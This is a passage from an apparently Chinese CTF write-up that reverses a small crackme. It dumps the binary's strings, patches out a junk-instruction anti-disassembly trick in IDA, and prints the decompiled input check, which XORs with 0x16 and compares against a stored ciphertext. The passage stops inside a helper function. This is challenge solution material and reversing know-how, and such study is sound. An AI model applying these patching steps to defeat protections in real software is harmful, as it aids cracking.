class="line">`typeof&#x27;</span><br><span class="line">`local static guard&#x27;</span><br><span class="line">`string&#x27;</span><br><span class="line">`vbase destructor&#x27;</span><br><span class="line">`vector deleting destructor&#x27;</span><br><span class="line">`default constructor closure&#x27;</span><br><span class="line">`scalar deleting destructor&#x27;</span><br><span class="line">`vector constructor iterator&#x27;</span><br><span class="line">`vector destructor iterator&#x27;</span><br><span class="line">`vector vbase constructor iterator&#x27;</span><br><span class="line">`virtual displacement map&#x27;</span><br><span class="line">`eh vector constructor iterator&#x27;</span><br><span class="line">`eh vector destructor iterator&#x27;</span><br><span class="line">`eh vector vbase constructor iterator&#x27;</span><br><span class="line">`copy constructor closure&#x27;</span><br><span class="line">`udt returning&#x27;</span><br><span class="line">`RTTI</span><br><span class="line">`local vftable&#x27;</span><br><span class="line">`local vftable constructor closure&#x27;</span><br><span class="line"> new[]</span><br><span class="line"> delete[]</span><br><span class="line">`omni callsig&#x27;</span><br><span class="line">`placement delete closure&#x27;</span><br><span class="line">`placement delete[] closure&#x27;</span><br><span class="line">`managed vector constructor iterator&#x27;</span><br><span class="line">`managed vector destructor iterator&#x27;</span><br><span class="line">`eh vector copy constructor iterator&#x27;</span><br><span class="line">`eh vector vbase copy constructor iterator&#x27;</span><br><span class="line">`dynamic initializer for &#x27;</span><br><span class="line">`dynamic atexit destructor for &#x27;</span><br><span class="line">`vector copy constructor iterator&#x27;</span><br><span class="line">`vector vbase copy constructor iterator&#x27;</span><br><span class="line">`managed vector copy constructor iterator&#x27;</span><br><span class="line">`local static thread guard&#x27;</span><br><span class="line">operator &quot;&quot;</span><br><span class="line">operator co_await</span><br><span class="line">operator&lt;=&gt;</span><br><span class="line"> Type Descriptor&#x27;</span><br><span class="line"> Base Class Descriptor at (</span><br><span class="line"> Base Class Array&#x27;</span><br><span class="line"> Class Hierarchy Descriptor&#x27;</span><br><span class="line"> Complete Object Locator&#x27;</span><br><span class="line">`anonymous namespace&#x27;</span><br><span class="line">FlsAlloc</span><br><span class="line">FlsFree</span><br><span class="line">FlsGetValue</span><br><span class="line">FlsSetValue</span><br><span class="line">InitializeCriticalSectionEx</span><br><span class="line">Unknown exception</span><br><span class="line">bad exception</span><br><span class="line">(null)</span><br><span class="line">CorExitProcess</span><br><span class="line">AreFileApisANSI</span><br><span class="line">CompareStringEx</span><br><span class="line">FlsGetValue2</span><br><span class="line">LCMapStringEx</span><br><span class="line">LocaleNameToLCID</span><br><span class="line">AppPolicyGetProcessTerminationMethod</span><br><span class="line">NAN(SNAN)</span><br><span class="line">nan(snan)</span><br><span class="line">NAN(IND)</span><br><span class="line">nan(ind)</span><br><span class="line">e+000</span><br><span class="line">Sunday</span><br><span class="line">Monday</span><br><span class="line">Tuesday</span><br><span class="line">Wednesday</span><br><span class="line">Thursday</span><br><span class="line">Friday</span><br><span class="line">Saturday</span><br><span class="line">January</span><br><span class="line">February</span><br><span class="line">March</span><br><span class="line">April</span><br><span class="line">June</span><br><span class="line">July</span><br><span class="line">August</span><br><span class="line">September</span><br><span class="line">October</span><br><span class="line">November</span><br><span class="line">December</span><br><span class="line">MM/dd/yy</span><br><span class="line">dddd, MMMM dd, yyyy</span><br><span class="line">HH:mm:ss</span><br><span class="line"> !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br><span class="line"> !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;|&#125;~</span><br><span class="line">d8L2</span><br><span class="line">[aOni*&#123;</span><br><span class="line">@2&amp;@</span><br><span class="line">&quot;RP(</span><br><span class="line">eLK(w</span><br><span class="line">FEMh</span><br><span class="line">h0&#x27;D</span><br><span class="line">owM&amp;</span><br><span class="line">~ $s%r</span><br><span class="line">@b;zO]</span><br><span class="line">$qE&#125;</span><br><span class="line">;*xh</span><br><span class="line">[&quot;93</span><br><span class="line">iu+-,</span><br><span class="line">\lo&#125;</span><br><span class="line">obwQ4</span><br><span class="line">&amp;Sgw</span><br><span class="line">R       E]</span><br><span class="line">?nz(</span><br><span class="line">=87M</span><br><span class="line">v2!L.2</span><br><span class="line">        cQr</span><br><span class="line">X/4B</span><br><span class="line">k=yI</span><br><span class="line">^&lt;V7w</span><br><span class="line">W&amp;|.</span><br><span class="line">1#INF</span><br><span class="line">1#QNAN</span><br><span class="line">1#SNAN</span><br><span class="line">1#IND</span><br><span class="line">lzZ?</span><br><span class="line">log10</span><br><span class="line">asin</span><br><span class="line">acos</span><br><span class="line">sqrt</span><br><span class="line">?log10</span><br><span class="line">        k8=</span><br><span class="line">?5Wg4p</span><br><span class="line">Nv$^</span><br><span class="line">w(@</span><br><span class="line">BC .=</span><br><span class="line">(lX</span><br><span class="line">#&#123; =</span><br><span class="line">`~R=</span><br><span class="line">&#125;s&quot;=</span><br><span class="line">%S#[k</span><br><span class="line">&quot;B &lt;1=</span><br><span class="line">\-!y</span><br><span class="line">#.X&#x27;=</span><br><span class="line">i9+=</span><br><span class="line">lzZ?</span><br><span class="line">sinh</span><br><span class="line">cosh</span><br><span class="line">tanh</span><br><span class="line">atan</span><br><span class="line">atan2</span><br><span class="line">ceil</span><br><span class="line">floor</span><br><span class="line">fabs</span><br><span class="line">modf</span><br><span class="line">ldexp</span><br><span class="line">_cabs</span><br><span class="line">_hypot</span><br><span class="line">fmod</span><br><span class="line">frexp</span><br><span class="line">_logb</span><br><span class="line">_nextafter</span><br><span class="line">.text$mn</span><br><span class="line">.text$x</span><br><span class="line">.idata$5</span><br><span class="line">.00cfg</span><br><span class="line">.CRT$XCA</span><br><span class="line">.CRT$XCAA</span><br><span class="line">.CRT$XCZ</span><br><span class="line">.CRT$XIA</span><br><span class="line">.CRT$XIAA</span><br><span class="line">.CRT$XIAC</span><br><span class="line">.CRT$XIC</span><br><span class="line">.CRT$XIZ</span><br><span class="line">.CRT$XPA</span><br><span class="line">.CRT$XPX</span><br><span class="line">.CRT$XPXA</span><br><span class="line">.CRT$XPZ</span><br><span class="line">.CRT$XTA</span><br><span class="line">.CRT$XTZ</span><br><span class="line">.rdata</span><br><span class="line">.rdata$r</span><br><span class="line">.rdata$sxdata</span><br><span class="line">.rdata$voltmd</span><br><span class="line">.rdata$zzzdbg</span><br><span class="line">.rtc$IAA</span><br><span class="line">.rtc$IZZ</span><br><span class="line">.rtc$TAA</span><br><span class="line">.rtc$TZZ</span><br><span class="line">.xdata$x</span><br><span class="line">.idata$2</span><br><span class="line">.idata$3</span><br><span class="line">.idata$4</span><br><span class="line">.idata$6</span><br><span class="line">.data</span><br><span class="line">.data$r</span><br><span class="line">.data$rs</span><br><span class="line">.bss</span><br><span class="line">.fptable</span><br><span class="line">UnhandledExceptionFilter</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">GetCurrentProcess</span><br><span class="line">TerminateProcess</span><br><span class="line">IsProcessorFeaturePresent</span><br><span class="line">QueryPerformanceCounter</span><br><span class="line">GetCurrentProcessId</span><br><span class="line">GetCurrentThreadId</span><br><span class="line">GetSystemTimeAsFileTime</span><br><span class="line">InitializeSListHead</span><br><span class="line">IsDebuggerPresent</span><br><span class="line">GetStartupInfoW</span><br><span class="line">GetModuleHandleW</span><br><span class="line">KERNEL32.dll</span><br><span class="line">RtlUnwind</span><br><span class="line">GetLastError</span><br><span class="line">SetLastError</span><br><span class="line">EnterCriticalSection</span><br><span class="line">LeaveCriticalSection</span><br><span class="line">DeleteCriticalSection</span><br><span class="line">InitializeCriticalSectionAndSpinCount</span><br><span class="line">TlsAlloc</span><br><span class="line">TlsGetValue</span><br><span class="line">TlsSetValue</span><br><span class="line">TlsFree</span><br><span class="line">FreeLibrary</span><br><span class="line">GetProcAddress</span><br><span class="line">LoadLibraryExW</span><br><span class="line">EncodePointer</span><br><span class="line">RaiseException</span><br><span class="line">GetStdHandle</span><br><span class="line">WriteFile</span><br><span class="line">GetModuleFileNameW</span><br><span class="line">ExitProcess</span><br><span class="line">GetModuleHandleExW</span><br><span class="line">GetCommandLineA</span><br><span class="line">GetCommandLineW</span><br><span class="line">HeapAlloc</span><br><span class="line">HeapFree</span><br><span class="line">FlsAlloc</span><br><span class="line">FlsGetValue</span><br><span class="line">FlsSetValue</span><br><span class="line">FlsFree</span><br><span class="line">InitializeCriticalSectionEx</span><br><span class="line">VirtualProtect</span><br><span class="line">CompareStringW</span><br><span class="line">LCMapStringW</span><br><span class="line">GetFileType</span><br><span class="line">FindClose</span><br><span class="line">FindFirstFileExW</span><br><span class="line">FindNextFileW</span><br><span class="line">IsValidCodePage</span><br><span class="line">GetACP</span><br><span class="line">GetOEMCP</span><br><span class="line">GetCPInfo</span><br><span class="line">MultiByteToWideChar</span><br><span class="line">WideCharToMultiByte</span><br><span class="line">GetEnvironmentStringsW</span><br><span class="line">FreeEnvironmentStringsW</span><br><span class="line">SetEnvironmentVariableW</span><br><span class="line">SetStdHandle</span><br><span class="line">GetStringTypeW</span><br><span class="line">GetProcessHeap</span><br><span class="line">FlushFileBuffers</span><br><span class="line">GetConsoleOutputCP</span><br><span class="line">GetConsoleMode</span><br><span class="line">GetFileSizeEx</span><br><span class="line">SetFilePointerEx</span><br><span class="line">HeapSize</span><br><span class="line">HeapReAlloc</span><br><span class="line">CloseHandle</span><br><span class="line">ReadFile</span><br><span class="line">ReadConsoleW</span><br><span class="line">CreateFileW</span><br><span class="line">WriteConsoleW</span><br><span class="line">DecodePointer</span><br><span class="line">Enter input:</span><br><span class="line">Read error</span><br><span class="line">Memory error</span><br><span class="line">FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;</span><br><span class="line">success</span><br><span class="line">fail</span><br><span class="line">%99s</span><br><span class="line"></span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"></span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">.?AVbad_exception@std@@</span><br><span class="line">.?AVexception@std@@</span><br><span class="line">.?AVtype_info@@</span><br><span class="line">1!1P1</span><br><span class="line">2-3j3y3</span><br><span class="line">5$50595&gt;5D5N5X5h5x5</span><br><span class="line">6$6,676&lt;6B6L6V6i6n6|6</span><br><span class="line">6P7~7</span><br><span class="line">8/9[9</span><br><span class="line">:+:2:8:J:T:</span><br><span class="line">;C;R;[;h;~;</span><br><span class="line">&lt;.&lt;7&lt;=&lt;P&lt;</span><br><span class="line">=5=?=`=</span><br><span class="line">&gt;&amp;&gt;:&gt;?&gt;R&gt;q&gt;</span><br><span class="line">0(01070=0R0[0i0q0</span><br><span class="line">1 1&amp;1/151=1B1V1[1</span><br><span class="line">5#5&#x27;5+5/53575;5?5C5G5K5O5S5W5[5_5c5g5k5o5s5w5&#123;5</span><br><span class="line">&lt;!&lt;L&lt;P&lt;</span><br><span class="line">=*=4=&gt;=L=g=y=</span><br><span class="line">&gt;/&gt;W&gt;k&gt;&#125;&gt;</span><br><span class="line">?8?E?N?S?X?s?&#125;?</span><br><span class="line">0-0=0</span><br><span class="line">0$1?1D1W2h2D4W4u4</span><br><span class="line">416h6o6t6x6|6</span><br><span class="line">7 7$7(7,7</span><br><span class="line">9$909&gt;9N9c9z9</span><br><span class="line">:&amp;:/:</span><br><span class="line">;9;b;</span><br><span class="line">K7S7Y7</span><br><span class="line">9&amp;:g;&lt;=@=D=H=L=P=T=X=</span><br><span class="line">&lt;&#x27;&lt;.&lt;7&lt;M&lt;f&lt;&#123;&lt;</span><br><span class="line">&lt;P=U=</span><br><span class="line">2$2&lt;2J2m2</span><br><span class="line">3.373D3S3g3p3</span><br><span class="line">3$434</span><br><span class="line">575?5H5Q5b5s5</span><br><span class="line">5&lt;6H6M6S6X6`6f6n6</span><br><span class="line">6e7q7</span><br><span class="line">98:a:q:</span><br><span class="line">;&quot;;&lt;;u;</span><br><span class="line">&lt;       &lt;&quot;&lt;3&lt;8&lt;</span><br><span class="line">1P2e2</span><br><span class="line">3!3&#x27;383=3B3Q3b3g3l3|3</span><br><span class="line">354&lt;4O4d4</span><br><span class="line">5!5&gt;5b5</span><br><span class="line">6E6i6</span><br><span class="line">7&quot;707Q7X7o7</span><br><span class="line">;?;Y;</span><br><span class="line">&lt;a=g=</span><br><span class="line">101:1a1k1</span><br><span class="line">7%:E:</span><br><span class="line">=k&gt;9?</span><br><span class="line">N1m3x3</span><br><span class="line">4&#x27;4-4</span><br><span class="line">4)5Z5</span><br><span class="line">5X6n6   7</span><br><span class="line">8&#x27;898L8e8</span><br><span class="line">9%9O9V9</span><br><span class="line">070j0</span><br><span class="line">5/5z5</span><br><span class="line">5=6P6u6</span><br><span class="line">9L9f9x9</span><br><span class="line">:&quot;:&amp;:0:C:Q:g:</span><br><span class="line">20?0y0</span><br><span class="line">5L5[5i5</span><br><span class="line">6I6P6</span><br><span class="line">7 727D7V7h7z7</span><br><span class="line">8+8=8O8q91:</span><br><span class="line">=R=i=</span><br><span class="line">?B?z?</span><br><span class="line">0S0n0</span><br><span class="line">0\1c1j1q1~1</span><br><span class="line">3%3S3</span><br><span class="line">4w7p:</span><br><span class="line">:*&lt;]&lt;r&lt;|&lt;</span><br><span class="line">=N=]=</span><br><span class="line">4$5t5</span><br><span class="line">7!9*9</span><br><span class="line">1=1D1K1n1!9)9Z9a9</span><br><span class="line">J1y7</span><br><span class="line">7&#x27;868</span><br><span class="line">:1      3</span><br><span class="line">3Y4_4x4&#125;4</span><br><span class="line">7$8[8</span><br><span class="line">:\;p;</span><br><span class="line">&lt;+=9=D=</span><br><span class="line">=&#x27;&gt;6&gt;t&gt;</span><br><span class="line">2U2l2</span><br><span class="line">3$3.3j3</span><br><span class="line">6i6u6</span><br><span class="line">7&#x27;7I7Y7e7t7&quot;8b8</span><br><span class="line">8&#x27;9&lt;9E9N9k:</span><br><span class="line">;6&gt;W?</span><br><span class="line">5:5D5J5S5v5~5</span><br><span class="line">546V6</span><br><span class="line">7L7P7T7X7\7`7d7h7l7p7t7x7|7</span><br><span class="line">7=8W8d8</span><br><span class="line">:A;M;a;m;y;</span><br><span class="line">&lt;/&lt;?&lt;K&lt;Z&lt;m=</span><br><span class="line">&gt;4&gt;H&gt;S&gt;</span><br><span class="line">&gt;)?l?</span><br><span class="line">161F1</span><br><span class="line">3;5E5Y5c5&#123;5</span><br><span class="line">5-6&amp;7Z:</span><br><span class="line">:$;(;,;0;</span><br><span class="line">;#&gt;=&gt;N&gt;</span><br><span class="line">/0X0(1,1014181&lt;1@1D1</span><br><span class="line">1v2&#123;2</span><br><span class="line">8&quot;:Q;</span><br><span class="line">&lt;7&lt;T&lt;q&lt;</span><br><span class="line">01&lt;1H1L1P1T1X1\1h1l1p1</span><br><span class="line">2 2(20282@2H2P2X2`2h2p2x2</span><br><span class="line">3 3(30383@3H3P3X3`3h3p3x3</span><br><span class="line">4 4(40484@4H4P4X4`4h4p4x4</span><br><span class="line">5 5(50585@5H5P5</span><br><span class="line">?$?,?0?4?8?&lt;?</span><br><span class="line">6(7,7074787&lt;7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7</span><br><span class="line">8 8$8(8,8084888&lt;8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8</span><br><span class="line">42&lt;2D2L2T2\2d2l2t2|2</span><br><span class="line">3$3,343&lt;3D3L3T3\3d3l3t3|3</span><br><span class="line">4$4,444&lt;4D4L4T4\4d4l4t4|4</span><br><span class="line">5$5,545&lt;5D5L5T5\5d5l5t5|5</span><br><span class="line">6$6,646&lt;6D6L6T6\6d6l6t6|6</span><br><span class="line">7$7,747&lt;7D7L7T7\7d7l7t7|7</span><br><span class="line">8$8,848&lt;8D8L8T8\8d8l8t8|8</span><br><span class="line">9$9,949&lt;9D9L9</span><br><span class="line">P3X3`3h3p3x3</span><br><span class="line">4 4(40484@4H4P4X4`4h4p4x4</span><br><span class="line">5 5(50585@5H5P5X5`5h5p5x5</span><br><span class="line">6 6(60686@6H6P6X6`6h6p6x6</span><br><span class="line">7 7(70787@7H7P7X7`7h7p7x7</span><br><span class="line">8 8(80888@8H8P8X8`8h8p8x8</span><br><span class="line">9 9(90989@9H9P9X9`9h9p9x9</span><br><span class="line">: :(:0:8:@:H:P:X:`:h:</span><br><span class="line">7L8T8\8d8l8t8|8</span><br><span class="line">9$9,9 :$:d:h:p:</span><br><span class="line">:L;P;`;d;l;</span><br><span class="line">0,000L0P0p0x0|0</span><br><span class="line">14181@1H1P1T1\1p1x1</span><br><span class="line">2d2h2</span><br><span class="line">3,303P3p3</span><br><span class="line">404P4p4</span><br><span class="line">505P5p5</span><br><span class="line">6,606</span><br><span class="line">282H2X2h2x2</span><br><span class="line">8 8$8(8,8084888&lt;8</span><br></pre></td></tr></table></figure>
<p>不难发现密文<strong>FuxNFb|$QXR#Xe#}F#lqZ[`T@Q&amp;&amp;</strong></p>
<p>alt+T再交叉引用定位到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00401327 C7 85 E8 FE FF FF 30 E0 41 00     mov     dword ptr [ebp-118h], offset aFuxnfbQxrXeFLq ; &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span><br></pre></td></tr></table></figure>
<p>F5无效，发现还没有函数，而且存在花指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short near ptr loc_4011EB+2</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB                                                                           ; .text:004011E9↑j</span><br><span class="line">.text:004011EB E8 FF 68 00 E0                    call    near ptr 0E0407AEFh</span><br><span class="line">.text:004011EB</span><br></pre></td></tr></table></figure>
<p>+2，把11EB的前两个字节nop掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short near ptr unk_4011ED</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB 90                                nop</span><br><span class="line">.text:004011EC 90                                nop</span><br><span class="line">.text:004011EC</span><br><span class="line">.text:004011EC                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011ED 68                                unk_4011ED db  68h ; h                  ; CODE XREF: .text:004011E9↑j</span><br><span class="line">.text:004011EE 00                                db    0 ; OFF32 SEGDEF [_data,41E000]</span><br><span class="line">.text:004011EF E0                                db 0E0h</span><br></pre></td></tr></table></figure>
<p>根据跳转提示，在11ED处C，转成代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:004011E7 74 02                             jz      short loc_4011EB</span><br><span class="line">.text:004011E7</span><br><span class="line">.text:004011E9 EB 02                             jmp     short loc_4011ED</span><br><span class="line">.text:004011E9</span><br><span class="line">.text:004011EB                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011EB</span><br><span class="line">.text:004011EB                                   loc_4011EB:                             ; CODE XREF: .text:004011E7↑j</span><br><span class="line">.text:004011EB 90                                nop</span><br><span class="line">.text:004011EC 90                                nop</span><br><span class="line">.text:004011EC</span><br><span class="line">.text:004011ED</span><br><span class="line">.text:004011ED                                   loc_4011ED:                             ; CODE XREF: .text:004011E9↑j</span><br><span class="line">.text:004011ED 68 00 E0 41 00                    push    offset aEnterInput              ; &quot;Enter input: &quot;</span><br><span class="line">.text:004011ED</span><br><span class="line">.text:004011ED                                   ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011F2 E8                                db 0E8h</span><br></pre></td></tr></table></figure>
<p>此时还无法创建函数，11F2处有未识别指令，直接C，此时可以创建函数了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4011C0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> __r_n_; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> p_i; <span class="comment">// [esp+18h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-10Ch]</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [esp+20h] [ebp-108h]</span></span><br><span class="line">  <span class="type">char</span> FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[<span class="number">256</span>]; <span class="comment">// [esp+24h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401440(Enter_input__);                    <span class="comment">// &quot;Enter input: &quot;</span></span><br><span class="line">  v0 = sub_4059A8(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_405B85(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, <span class="number">256</span>, v0) )</span><br><span class="line">  &#123;</span><br><span class="line">    __r_n_ = sub_4079B0(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, r_n);<span class="comment">// &quot;\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ( __r_n_ &gt;= <span class="number">0x100</span> )</span><br><span class="line">      sub_40159D();</span><br><span class="line">    FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;[__r_n_] = <span class="number">0</span>;</span><br><span class="line">    p_i = <span class="number">0</span>;</span><br><span class="line">    v3 = sub_407A00(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;);</span><br><span class="line">    lpMem = (LPVOID)sub_401000(FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, v3, &amp;p_i);</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; p_i; ++i )</span><br><span class="line">        *((_BYTE *)lpMem + i) ^= <span class="number">0x16u</span>;</span><br><span class="line">      _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_ = sub_407A00(aFuxnfbQxrXeFLq);<span class="comment">// &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ( p_i != _FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;_ || sub_4021DB(</span><br><span class="line">                                                      lpMem,</span><br><span class="line">                                                      aFuxnfbQxrXeFLq,<span class="comment">// &quot;FuxNFb|$QXR#Xe#&#125;F#lqZ[`T@Q&amp;&amp;&quot;</span></span><br><span class="line">                                                      p_i) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aFail);                      <span class="comment">// &quot;fail\n&quot;</span></span><br><span class="line">        sub_401440(a99s);                       <span class="comment">// &quot;%99s&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aSuccess);                   <span class="comment">// &quot;success\n&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      sub_407990(lpMem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">      sub_401400(v4, aMemoryError);             <span class="comment">// &quot;Memory error\n&quot;</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">    sub_401400(v1, Memory_error_n);             <span class="comment">// &quot;Read error\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>401000:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401000</span><span class="params">(_BYTE *FuxNFb_$QXR_Xe__F_lqZ[_T@Q&amp;&amp;, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> *p_i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> n61_1; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> n61; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// 